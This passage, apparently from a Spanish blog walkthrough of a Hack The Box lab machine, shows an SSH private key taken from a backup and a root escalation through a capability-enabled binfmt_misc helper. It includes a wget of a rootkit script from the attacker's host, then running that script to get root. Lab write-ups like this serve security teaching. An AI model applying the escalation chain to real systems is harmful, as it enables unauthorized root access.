</code></pre></div><p>Vamos a extraer los archivos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@retired:~$ mv 2022-04-03_13-14-04-html.zip /tmp
www-data@retired:~$ cd /tmp
www-data@retired:/tmp$ unzip 2022-04-03_13-14-04-html.zip
Archive:  2022-04-03_13-14-04-html.zip
   creating: var/www/html/
   creating: var/www/html/js/
  inflating: var/www/html/js/scripts.js
  inflating: var/www/html/activate_license.php
   creating: var/www/html/assets/
  inflating: var/www/html/assets/favicon.ico
   creating: var/www/html/assets/img/
  inflating: var/www/html/assets/img/close-icon.svg
  inflating: var/www/html/assets/img/navbar-logo.svg
   creating: var/www/html/assets/img/about/
  inflating: var/www/html/assets/img/about/2.jpg
  inflating: var/www/html/assets/img/about/4.jpg
  inflating: var/www/html/assets/img/about/3.jpg
  inflating: var/www/html/assets/img/about/1.jpg
   creating: var/www/html/assets/img/logos/
  inflating: var/www/html/assets/img/logos/facebook.svg
  inflating: var/www/html/assets/img/logos/microsoft.svg
  inflating: var/www/html/assets/img/logos/google.svg
  inflating: var/www/html/assets/img/logos/ibm.svg
   creating: var/www/html/assets/img/team/
  inflating: var/www/html/assets/img/team/2.jpg
  inflating: var/www/html/assets/img/team/3.jpg
  inflating: var/www/html/assets/img/team/1.jpg
  inflating: var/www/html/assets/img/header-bg.jpg
  inflating: var/www/html/beta.html
  inflating: var/www/html/default.html
  inflating: var/www/html/index.php
  inflating: var/www/html/dev_id_rsa
   creating: var/www/html/css/
 extracting: var/www/html/css/styles.css
www-data@retired:/tmp$ cat var/www/html/dev_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>Ahora nos podemos conectar como <code>dev</code> y obtener la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">chmod</span> 600 id_rsa

<span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i id_rsa dev@10.10.11.154  
<span class="code-green">dev@retired</span>:<span class="code-blue">~</span>$ cat user.txt
f78b01da6c3d56436a6005509fdff826
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Este usuario tiene un directorio llamado <code>emuemu</code> (podemos recordarlo de la p谩gina web):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~</span>$ ls -la
total 40
drwx------ 6 dev  dev  4096 Mar 11 14:36 <span class="code-blue">.</span>
drwxr-xr-x 3 root root 4096 Mar 11 14:36 <span class="code-blue">..</span>
lrwxrwxrwx 1 root root    9 Oct 13 02:59 <span class="code-cyan">.bash_history</span> -&gt; <span class="code-yellow">/dev/null</span>  
-rw------- 1 dev  dev   220 Aug  4  2021 .bash_logout
-rw------- 1 dev  dev  3526 Aug  4  2021 .bashrc
drwxr-xr-x 3 dev  dev  4096 Mar 11 14:36 <span class="code-blue">.local</span>
-rw------- 1 dev  dev   807 Aug  4  2021 .profile
drwx------ 2 dev  dev  4096 Mar 11 14:36 <span class="code-blue">.ssh</span>
drwx------ 2 dev  dev  4096 Mar 11 14:36 <span class="code-blue">activate_license</span>
drwx------ 3 dev  dev  4096 Mar 11 14:36 <span class="code-blue">emuemu</span>
-rw-r----- 1 root dev    33 Apr  3 21:28 user.txt
</code></pre></div><p>Tenemos todo esto:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ ls -la
total 68
drwx------ 3 dev dev  4096 Mar 11 14:36 <span class="code-blue">.</span>
drwx------ 6 dev dev  4096 Mar 11 14:36 <span class="code-blue">..</span>
-rw------- 1 dev dev   673 Oct 13 02:59 Makefile
-rw------- 1 dev dev   228 Oct 13 02:59 README.md
-rw------- 1 dev dev 16608 Oct 13 02:59 emuemu
-rw------- 1 dev dev   168 Oct 13 02:59 emuemu.c
-rw------- 1 dev dev 16864 Oct 13 02:59 reg_helper
-rw------- 1 dev dev   502 Oct 13 02:59 reg_helper.c  
drwx------ 2 dev dev  4096 Mar 11 14:36 <span class="code-blue">test</span>
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ ls -la test
total 12
drwx------ 2 dev dev 4096 Mar 11 14:36 <span class="code-blue">.</span>
drwx------ 3 dev dev 4096 Mar 11 14:36 <span class="code-blue">..</span>
-rwxr-xr-x 1 dev dev   70 Oct 13 02:59 <span class="code-green">examplerom</span>
</code></pre></div><p>Vamos a leer el <code>README.md</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat README.md
EMUEMU is the official software emulator for the handheld console OSTRICH.

After installation with `make install`, OSTRICH ROMs can be simply executed from the terminal.  
For example the ROM named `rom` can be run with `./rom`.
</code></pre></div><p>Dice que podemos ejecutar la ROP como un archivo ejecutable normal:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ test/examplerom  
EMUEMU is still under development.
</code></pre></div><p>Perfecto, podemos ejecutar una ROM, vamos a mirar los archivos en C:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat emuemu.c  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>

<span class="mtk3">/*</span> <span class="mtk3">currently</span> <span class="mtk3">this</span> <span class="mtk3">is</span> <span class="mtk3">only</span> <span class="mtk3">a</span> <span class="mtk3">dummy</span> <span class="mtk3">implementation</span> <span class="mtk3">doing</span> <span class="mtk3">nothing</span> <span class="mtk3">*/</span>  

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"EMUEMU</span> <span class="mtk4">is</span> <span class="mtk4">still</span> <span class="mtk4">under</span> <span class="mtk4">development."</span><span class="mtk1">);</span>
    <span class="mtk5">return</span> <span class="mtk6">1</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>隆Eh! este archivo genera la ROM que hemos ejecutado antes. Vamos a comprobarlo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ file test/examplerom
test/examplerom: data
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat test/examplerom
7OSTRICHROM
this is a minimal rom with a valid file type signature
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ xxd test/examplerom
00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74  .7OSTRICH.ROM..t  
00000010: 6869 7320 6973 2061 206d 696e 696d 616c  his is a minimal
00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69   rom with a vali
00000030: 6420 6669 6c65 2074 7970 6520 7369 676e  d file type sign
00000040: 6174 7572 650a                           ature.
</code></pre></div><h3 id="an谩lisis-de-la-rom">An谩lisis de la ROM</h3><p>驴Pero, qu茅 pasa aqu铆? <code>test/examplerom</code> parece un archivo normal. Por lo menos no es un ELF. Vamos a ver si <code>reg_helper.c</code> nos lo clarifica:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat reg_helper.c  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#define</span> <span class="mtk8">_GNU_SOURCE</span>

<span class="mtk5">#include</span> <span class="mtk4">&lt;fcntl.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;stdio.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;string.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;sys/stat.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;sys/types.h&gt;</span>
<span class="mtk5">#include</span> <span class="mtk4">&lt;unistd.h&gt;</span>

<span class="mtk7 mtki">int</span> <span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">void</span><span class="mtk1">)</span> <span class="mtk1">{</span>
    <span class="mtk7 mtki">char</span> <span class="mtk1">cmd[</span><span class="mtk6">512</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk1">{</span> <span class="mtk6">0</span> <span class="mtk1">};</span>

    <span class="mtk8">read</span><span class="mtk1">(STDIN_FILENO,</span> <span class="mtk1">cmd,</span> <span class="mtk5">sizeof</span><span class="mtk1">(cmd));</span> <span class="mtk1">cmd[</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">]</span> <span class="mtk5">=</span> <span class="mtk6">0</span><span class="mtk1">;</span>

    <span class="mtk7 mtki">int</span> <span class="mtk1">fd</span> <span class="mtk5">=</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/proc/sys/fs/binfmt_misc/register"</span><span class="mtk1">,</span> <span class="mtk1">O_WRONLY);</span>  
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span> <span class="mtk5">==</span> <span class="mtk1">fd)</span>
        <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"open"</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">write</span><span class="mtk1">(fd,</span> <span class="mtk1">cmd,</span> <span class="mtk8">strnlen</span><span class="mtk1">(cmd,</span><span class="mtk5">sizeof</span><span class="mtk1">(cmd)))</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span>
        <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"write"</span><span class="mtk1">);</span>
    <span class="mtk5">if</span> <span class="mtk1">(</span><span class="mtk8">close</span><span class="mtk1">(fd)</span> <span class="mtk5">==</span> <span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">)</span>
        <span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"close"</span><span class="mtk1">);</span>

    <span class="mtk5">return</span> <span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Esto es bastante interesante, deber铆amos hacer un poco de investigaci贸n acerca de <code>/proc/sys/fs/binfmt_misc/register</code>. Pero vamos a mirar el <code>Makefile</code> primero:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat Makefile  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">CC</span> <span class="mtk1">:=</span> <span class="mtk1">gcc</span>
<span class="mtk1">CFLAGS</span> <span class="mtk1">:=</span> <span class="mtk1">-std=c99</span> <span class="mtk1">-Wall</span> <span class="mtk1">-Werror</span> <span class="mtk1">-Wextra</span> <span class="mtk1">-Wpedantic</span> <span class="mtk1">-Wconversion</span> <span class="mtk1">-Wsign-conversion</span>  

<span class="mtk1">SOURCES</span> <span class="mtk1">:=</span> <span class="mtk4">$(</span><span class="mtk7">wildcard</span> <span class="mtk6">*</span><span class="mtk4">.c)</span>
<span class="mtk1">TARGETS</span> <span class="mtk1">:=</span> <span class="mtk4">$(</span><span class="mtk1">SOURCES:.c=</span><span class="mtk4">)</span>

<span class="mtk7">.PHONY</span><span class="mtk1">:</span> <span class="mtk1">install</span> <span class="mtk1">clean</span>

<span class="mtk8">install</span><span class="mtk1">:</span> <span class="mtk4">$(</span><span class="mtk1">TARGETS</span><span class="mtk4">)</span>
        <span class="mtk1">@echo</span> <span class="mtk1">"[+]</span> <span class="mtk1">Installing</span> <span class="mtk1">program</span> <span class="mtk1">files"</span>
        <span class="mtk1">install</span> <span class="mtk1">--mode</span> <span class="mtk1">0755</span> <span class="mtk1">emuemu</span> <span class="mtk1">/usr/bin/</span>
        <span class="mtk1">mkdir</span> <span class="mtk1">--parent</span> <span class="mtk1">--mode</span> <span class="mtk1">0755</span> <span class="mtk1">/usr/lib/emuemu</span> <span class="mtk1">/usr/lib/binfmt.d</span>
        <span class="mtk1">install</span> <span class="mtk1">--mode</span> <span class="mtk1">0750</span> <span class="mtk1">--group</span> <span class="mtk1">dev</span> <span class="mtk1">reg_helper</span> <span class="mtk1">/usr/lib/emuemu/</span>
        <span class="mtk1">setcap</span> <span class="mtk1">cap_dac_override=ep</span> <span class="mtk1">/usr/lib/emuemu/reg_helper</span>

        <span class="mtk1">@echo</span> <span class="mtk1">"[+]</span> <span class="mtk1">Register</span> <span class="mtk1">OSTRICH</span> <span class="mtk1">ROMs</span> <span class="mtk1">for</span> <span class="mtk1">execution</span> <span class="mtk1">with</span> <span class="mtk1">EMUEMU"</span>
        <span class="mtk8">echo</span> <span class="mtk8">'</span><span class="mtk1">:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/em</span><span class="mtk1">uemu:'</span> <span class="mtk6">\</span>
                <span class="mtk1">|</span> <span class="mtk1">tee</span> <span class="mtk1">/usr/lib/binfmt.d/emuemu.conf</span> <span class="mtk6">\</span>
                <span class="mtk1">|</span> <span class="mtk1">/usr/lib/emuemu/reg_helper</span>

<span class="mtk8">clean</span><span class="mtk1">:</span>
        <span class="mtk1">rm</span> <span class="mtk1">-f</span> <span class="mtk1">--</span> <span class="mtk4">$(</span><span class="mtk1">TARGETS</span><span class="mtk4">)</span>
</code></pre></div><p>Perfecto, sabemos que hay binarios en <code>/usr/bin/emuemu</code> y <code>/usr/lib/emuemu/reg_helper</code>. Estos son los mismos que los que vimos antes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ md5sum /usr/bin/emuemu emuemu /usr/lib/emuemu/reg_helper reg_helper  
27641ed1f6105c6f70f5167610fa0b7e  /usr/bin/emuemu
27641ed1f6105c6f70f5167610fa0b7e  emuemu
1600a7013d283b9aaa6b7a07f8e45b2a  /usr/lib/emuemu/reg_helper
1600a7013d283b9aaa6b7a07f8e45b2a  reg_helper
</code></pre></div><p>Y no podemos modificarlos. N贸tese que el <code>Makefile</code> configura un formato ejecutable personalizado (<code>binfmt</code>). Se cuarda en <code>/usr/lib/binfmt.d/emuemu.conf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat /usr/lib/binfmt.d/emuemu.conf  
:EMUEMU:M::\x13\x37OSTRICH\x00ROM\x00::/usr/bin/emuemu:
</code></pre></div><p>Entonces, todos los archivos que empiecen por <code>\x13\x37OSTRICH\x00ROM\x00</code> ser谩n ejecutados con <code>/usr/bin/emuemu</code>. Ahora todo tiene sentido:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ /usr/bin/emuemu
EMUEMU is still under development.
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ xxd test/examplerom
00000000: 1337 4f53 5452 4943 4800 524f 4d00 0a74  .7OSTRICH.ROM..t  
00000010: 6869 7320 6973 2061 206d 696e 696d 616c  his is a minimal
00000020: 2072 6f6d 2077 6974 6820 6120 7661 6c69   rom with a vali
00000030: 6420 6669 6c65 2074 7970 6520 7369 676e  d file type sign
00000040: 6174 7572 650a                           ature.
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ test/examplerom
EMUEMU is still under development.
</code></pre></div><p>Debido a <code>reg_helper</code>, somos capaces de crear formatos ejecutables personalizados. Por ejemplo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ echo ':test:M::rocky::/usr/bin/emuemu:' | /usr/lib/emuemu/reg_helper  
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ echo -e 'rocky\nThis is a custom executable file' > /tmp/test
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cat /tmp/test
rocky
This is a custom executable file
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ chmod +x /tmp/test
<span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ /tmp/test
EMUEMU is still under development.
</code></pre></div><h3 id="exploitaci贸n-de-binfmt_misc">Exploitaci贸n de <code>binfmt_misc</code></h3><p>Vale, 驴pero qu茅 podemos hacer con esto? Bueno, existe un <em>exploit</em> de <code>/proc/sys/fs/binfmt_misc/register</code> cuando tenemos permisos de escritura en 茅l, y lo tenemos porque <code>reg_helper</code> lo modifica (tiene una <em>capability</em> <code>CAP_DAC_OVERRIDE</code>). El <em>exploit</em> se puede encontrar <a href="https://github.com/toffan/binfmt_misc/blob/master/binfmt_rootkit">aqu铆</a>.</p><p>Tenemos que descargar el <em>script</em> y modificar algunas l铆neas. Primero, me deshar茅 de la validaci贸n de que <code>/proc/sys/fs/binfmt_misc/register</code> es modificable (ya sabemos que s铆). Y luego, tenemos que modificar la manera en la que se escriben los datos en el registro. Es decir, esta l铆nea:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">echo</span> <span class="mtk4">"</span><span class="mtk1">$binfmt_line</span><span class="mtk4">"</span> <span class="mtk5">&gt;</span> <span class="mtk4">"</span><span class="mtk1">$mountpoint</span><span class="mtk4">"</span><span class="mtk1">/register</span></code></pre></div><p>Se transforma en esta:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7">echo</span> <span class="mtk4">"</span><span class="mtk1">$binfmt_line</span><span class="mtk4">"</span> <span class="mtk5">|</span> <span class="mtk1">/usr/lib/emuemu/reg_helper</span>
</code></pre></div><p>Finalmente, descargamos el <em>script</em> en la m谩quina y lo ejecutamos para convertirnos en <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">dev@retired</span>:<span class="code-blue">~/emuemu</span>$ cd /tmp
<span class="code-green">dev@retired</span>:<span class="code-blue">/tmp</span>$ wget -q 10.10.17.44/binfmt_rootkit  
<span class="code-green">dev@retired</span>:<span class="code-blue">/tmp</span>$ chmod +x binfmt_rootkit
<span class="code-green">dev@retired</span>:<span class="code-blue">/tmp</span>$ ./binfmt_rootkit
uid=0(root) euid=0(root)
# cat /root/root.txt
d8544f2779e7f65f61a1fcbe7eee471a
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeraci贸n">Enumeraci贸n</a></li><li><a href="#acceso-a-la-m谩quina">Acceso a la m谩quina</a><ul><li><a href="#explotaci贸n-de-_directory-path-traversal_">Explotaci贸n de <em>Directory Path Traversal</em></a></li><li><a href="#an谩lisis-de-un-binario">An谩lisis de un binario</a></li><li><a href="#preparaci贸n-del-_exploit_">Preparaci贸n del <em>exploit</em></a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a></li></ul></li><li><a href="#enumeraci贸n-del-sistema">Enumeraci贸n del sistema</a></li><li><a href="#movimiento-lateral-al-usuario-dev">Movimiento lateral al usuario <code>dev</code></a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#an谩lisis-de-la-rom">An谩lisis de la ROM</a></li><li><a href="#exploitaci贸n-de-binfmt_misc">Exploitaci贸n de <code>binfmt_misc</code></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0"> <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit="return window.open(&#34;https://tinyletter.com/7Rocky&#34;,&#34;popupwindow&#34;,&#34;scrollbars=yes,width=800,height=600&#34;),!0"><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electr贸nico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky 2022</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedInOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHubOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" 